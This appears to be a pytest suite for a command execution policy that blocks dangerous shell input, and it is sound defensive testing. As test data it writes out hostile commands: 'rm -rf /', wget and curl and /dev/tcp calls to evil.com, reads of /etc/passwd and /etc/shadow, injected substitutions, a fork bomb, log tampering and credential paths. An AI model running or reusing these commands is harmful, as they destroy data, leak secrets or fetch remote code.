"""
Tests for core/security/execution_policy.py (Phase 14a Security Hardening)

Tests command injection prevention, path traversal, and dangerous command blocking.
"""

import pytest

from core.security_pkg.security.execution_policy import (
    CommandType,
    ExecutionPolicy,
    get_execution_policy,
)


@pytest.fixture
def policy(tmp_path):
    """Create ExecutionPolicy with temp workspace."""
    return ExecutionPolicy(tmp_path)


class TestDangerousCommandBlocking:
    """Test that dangerous commands are blocked."""

    def test_blocks_rm_rf_root(self, policy):
        """rm -rf / should be blocked."""
        is_valid, error = policy.validate_command("rm -rf /")
        assert not is_valid
        assert "rm" in error.lower() or "blocked" in error.lower()

    def test_blocks_rm_rf_home(self, policy):
        """rm -rf ~ should be blocked."""
        is_valid, error = policy.validate_command("rm -rf ~")
        assert not is_valid
        assert "blocked" in error.lower()

    def test_blocks_rm_rf_wildcard(self, policy):
        """rm -rf * should be blocked."""
        is_valid, error = policy.validate_command("rm -rf *")
        assert not is_valid

    def test_blocks_rm_parent_traversal(self, policy):
        """rm -rf .. should be blocked."""
        is_valid, error = policy.validate_command("rm -rf ..")
        assert not is_valid

    def test_blocks_sudo(self, policy):
        """sudo should be blocked."""
        is_valid, error = policy.validate_command("sudo ls")
        assert not is_valid
        assert "blocked executable" in error.lower()

    def test_blocks_su(self, policy):
        """su should be blocked."""
        is_valid, error = policy.validate_command("su -")
        assert not is_valid

    def test_blocks_netcat(self, policy):
        """nc (netcat) should be blocked."""
        is_valid, error = policy.validate_command("nc -l 4444")
        assert not is_valid

    def test_blocks_wget(self, policy):
        """wget should be blocked."""
        is_valid, error = policy.validate_command("wget http://evil.com/malware")
        assert not is_valid

    def test_blocks_curl(self, policy):
        """curl should be blocked."""
        is_valid, error = policy.validate_command("curl http://evil.com/malware")
        assert not is_valid

    def test_blocks_powershell(self, policy):
        """powershell should be blocked."""
        is_valid, error = policy.validate_command("powershell -c 'evil'")
        assert not is_valid

    def test_blocks_cmd_exe(self, policy):
        """cmd.exe should be blocked."""
        is_valid, error = policy.validate_command("cmd.exe /c dir")
        assert not is_valid

    def test_blocks_pwsh(self, policy):
        """pwsh should be blocked."""
        is_valid, error = policy.validate_command("pwsh -c 'evil'")
        assert not is_valid


class TestCommandInjection:
    """Test command injection prevention."""

    def test_blocks_command_chaining_semicolon(self, policy):
        """Commands with ; should be blocked for unsafe executables."""
        is_valid, error = policy.validate_command("ls ; rm -rf /")
        assert not is_valid

    def test_blocks_command_chaining_and(self, policy):
        """Commands with && should be analyzed."""
        # This should be blocked because of the rm -rf /
        is_valid, error = policy.validate_command("ls && rm -rf /")
        assert not is_valid

    def test_blocks_command_substitution_dollar(self, policy):
        """$(...) command substitution should be blocked."""
        is_valid, error = policy.validate_command("echo $(cat /etc/passwd)")
        assert not is_valid

    def test_blocks_command_substitution_backtick(self, policy):
        """Backtick command substitution should be blocked."""
        is_valid, error = policy.validate_command("echo `cat /etc/passwd`")
        assert not is_valid

    def test_blocks_etc_passwd_access(self, policy):
        """Commands accessing /etc/passwd should be blocked."""
        is_valid, error = policy.validate_command("cat /etc/passwd")
        assert not is_valid
        assert "password" in error.lower()

    def test_blocks_etc_shadow_access(self, policy):
        """Commands accessing /etc/shadow should be blocked."""
        is_valid, error = policy.validate_command("cat /etc/shadow")
        assert not is_valid


class TestSafeCommands:
    """Test that safe commands are allowed."""

    def test_allows_ls(self, policy):
        """ls should be allowed."""
        is_valid, error = policy.validate_command("ls")
        assert is_valid
        assert error is None

    def test_allows_ls_la(self, policy):
        """ls -la should be allowed."""
        is_valid, error = policy.validate_command("ls -la")
        assert is_valid

    def test_allows_pwd(self, policy):
        """pwd should be allowed."""
        is_valid, error = policy.validate_command("pwd")
        assert is_valid

    def test_allows_echo(self, policy):
        """echo should be allowed."""
        is_valid, error = policy.validate_command("echo hello")
        assert is_valid

    def test_allows_cat_local_file(self, policy):
        """cat on local file should be allowed."""
        is_valid, error = policy.validate_command("cat README.md")
        assert is_valid

    def test_allows_python_version(self, policy):
        """python --version should be allowed."""
        is_valid, error = policy.validate_command("python --version")
        assert is_valid

    def test_allows_git_status(self, policy):
        """git status should be allowed."""
        is_valid, error = policy.validate_command("git status")
        assert is_valid


class TestCommandAnalysis:
    """Test command analysis for shell=True vs shell=False."""

    def test_simple_command_uses_shell_false(self, policy):
        """Simple commands should use shell=False."""
        analysis = policy.analyze_command("ls -la")
        assert analysis.command_type == CommandType.SIMPLE
        assert analysis.requires_shell is False
        assert analysis.executable == "ls"
        assert analysis.arguments == ["-la"]

    def test_complex_grep_allowed(self, policy):
        """grep with pipe should be allowed (COMPLEX)."""
        analysis = policy.analyze_command("grep pattern file.txt | head")
        assert analysis.command_type == CommandType.COMPLEX
        assert analysis.requires_shell is True

    def test_blocked_command_has_reason(self, policy):
        """Blocked commands should have a reason."""
        analysis = policy.analyze_command("sudo ls")
        assert analysis.command_type == CommandType.BLOCKED
        assert analysis.blocked_reason is not None
        assert "blocked" in analysis.blocked_reason.lower()

    def test_malformed_command_blocked(self, policy):
        """Malformed commands (unbalanced quotes) should be blocked."""
        analysis = policy.analyze_command("echo 'unclosed")
        assert analysis.command_type == CommandType.BLOCKED
        assert "malformed" in analysis.blocked_reason.lower()


class TestPathSecurity:
    """Test path access control."""

    def test_blocks_ssh_directory(self, policy):
        """SSH directory should be blocked."""
        # Create a path that contains .ssh
        ssh_path = policy.workspace_path.parent / ".ssh" / "id_rsa"
        assert not policy.is_path_allowed(ssh_path)

    def test_blocks_aws_credentials(self, policy):
        """AWS credentials should be blocked."""
        aws_path = policy.workspace_path.parent / ".aws" / "credentials"
        assert not policy.is_path_allowed(aws_path)

    def test_blocks_env_file(self, policy):
        """env files should be blocked."""
        env_path = policy.workspace_path / ".env"
        assert not policy.is_path_allowed(env_path)

    def test_allows_workspace_read(self, policy):
        """Workspace paths should be allowed for read."""
        workspace_file = policy.workspace_path / "test.txt"
        # Create the file first to ensure it can resolve
        workspace_file.parent.mkdir(parents=True, exist_ok=True)
        workspace_file.touch()
        assert policy.is_path_allowed(workspace_file, operation="read")

    def test_allows_workspace_write(self, policy):
        """Workspace paths should be allowed for write."""
        workspace_file = policy.workspace_path / "test.txt"
        workspace_file.parent.mkdir(parents=True, exist_ok=True)
        assert policy.is_path_allowed(workspace_file, operation="write")

    def test_blocks_write_outside_workspace(self, policy):
        """Write outside workspace should be blocked."""
        outside_file = policy.workspace_path.parent / "evil.txt"
        assert not policy.is_path_allowed(outside_file, operation="write")


class TestArgumentSanitization:
    """Test argument sanitization."""

    def test_removes_null_bytes(self, policy):
        """Null bytes should be removed."""
        sanitized = policy.sanitize_arguments(["hello\x00world"])
        assert sanitized == ["helloworld"]

    def test_removes_command_substitution(self, policy):
        """Command substitution should be removed."""
        sanitized = policy.sanitize_arguments(["$(whoami)"])
        assert sanitized == [""]

    def test_removes_backtick_substitution(self, policy):
        """Backtick substitution should be removed."""
        sanitized = policy.sanitize_arguments(["`id`"])
        assert sanitized == [""]


class TestSafeExecutionArgs:
    """Test get_safe_execution_args method."""

    def test_returns_args_for_simple(self, policy):
        """Simple command returns args with shell=False."""
        result = policy.get_safe_execution_args("ls -la")
        assert result is not None
        args, use_shell = result
        assert args == ["ls", "-la"]
        assert use_shell is False

    def test_returns_none_for_blocked(self, policy):
        """Blocked command returns None."""
        result = policy.get_safe_execution_args("sudo rm -rf /")
        assert result is None

    def test_returns_shell_true_for_complex(self, policy):
        """Complex command returns shell=True."""
        result = policy.get_safe_execution_args("grep pattern file | head")
        assert result is not None
        args, use_shell = result
        assert use_shell is True


class TestForkBombPrevention:
    """Test fork bomb prevention."""

    def test_blocks_fork_bomb(self, policy):
        """Fork bomb patterns should be blocked."""
        is_valid, error = policy.validate_command(":(){:|:&};:")
        assert not is_valid

    def test_blocks_while_true_loop(self, policy):
        """while true loops should be blocked."""
        is_valid, error = policy.validate_command("while true; do echo x; done")
        assert not is_valid


class TestNetworkBlocking:
    """Test network operation blocking."""

    def test_blocks_bash_tcp_redirect(self, policy):
        """Bash /dev/tcp redirect should be blocked."""
        is_valid, error = policy.validate_command("bash -c 'cat < /dev/tcp/evil.com/80'")
        assert not is_valid  # bash is blocked

    def test_blocks_network_tools(self, policy):
        """Network exfiltration tools should be blocked."""
        # These are blocked because they are dangerous executables
        assert not policy.validate_command("telnet evil.com 80")[0]
        assert not policy.validate_command("ftp evil.com")[0]

    def test_blocks_local_binding_pattern(self, policy):
        """Local listener/binding patterns should be blocked."""
        is_valid, error = policy.validate_command("python -m http.server 8080 --bind 0.0.0.0")
        assert not is_valid


class TestAuditAndHistoryProtection:
    """Test history/log tampering protections."""

    def test_blocks_history_manipulation(self, policy):
        """history -c should be blocked."""
        is_valid, error = policy.validate_command("history -c")
        assert not is_valid

    def test_blocks_unset_hist(self, policy):
        """unset HISTFILE should be blocked."""
        is_valid, error = policy.validate_command("unset HISTFILE")
        assert not is_valid

    def test_blocks_log_tampering_redirect(self, policy):
        """Redirects into /var/log should be blocked."""
        is_valid, error = policy.validate_command("echo hacked > /var/log/app.log")
        assert not is_valid


class TestSingleton:
    """Test singleton pattern."""

    def test_get_execution_policy_requires_path_first_time(self):
        """First call requires workspace_path."""
        # Reset singleton for test
        import core.security_pkg.security.execution_policy as module

        module._policy = None

        with pytest.raises(ValueError, match="workspace_path required"):
            get_execution_policy()

    def test_get_execution_policy_returns_same_instance(self, tmp_path):
        """Subsequent calls return same instance."""
        import core.security_pkg.security.execution_policy as module

        module._policy = None

        policy1 = get_execution_policy(tmp_path)
        policy2 = get_execution_policy()
        assert policy1 is policy2


class TestEdgeCases:
    """Test edge cases."""

    def test_empty_command(self, policy):
        """Empty command should fail validation."""
        is_valid, error = policy.validate_command("")
        assert not is_valid

    def test_whitespace_only_command(self, policy):
        """Whitespace-only command should fail validation."""
        is_valid, error = policy.validate_command("   ")
        assert not is_valid

    def test_very_long_command(self, policy):
        """Very long commands should be handled."""
        long_cmd = "echo " + "x" * 10000
        is_valid, error = policy.validate_command(long_cmd)
        assert is_valid  # Echo is safe

    def test_unicode_in_command(self, policy):
        """Unicode in commands should be handled."""
        is_valid, error = policy.validate_command("echo 'Hello 世界'")
        assert is_valid
